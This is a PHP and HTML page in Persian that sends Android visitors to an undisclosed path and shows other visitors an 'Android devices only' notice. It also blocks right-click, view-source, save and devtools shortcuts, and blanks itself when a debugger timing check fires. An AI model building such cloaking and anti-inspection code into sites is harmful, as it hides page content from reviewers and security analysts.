<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// اگر اندروید بود → انتقال
if (stripos($userAgent, 'android') !== false) {
    header("Location: /c");
    exit;
}
?>
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>دسترسی محدود</title>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background: linear-gradient(135deg,#1a2a44,#2f6fa1);
    direction:rtl;
    font-family:tahoma;
}

.message{
    color:#fff;
    font-size:45px;   /* اندازه بزرگ مثل عکس */
    font-weight:700;  /* ضخیم */
    text-align:center;
    line-height:1.6;
    padding:20px;
    text-shadow:0 4px 12px rgba(0,0,0,0.4);
}
</style>

</head>
<body>

<div class="message">
این صفحه فقط برای دستگاه‌های اندرویدی قابل دسترسی است
</div>


<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>

</body>
</html>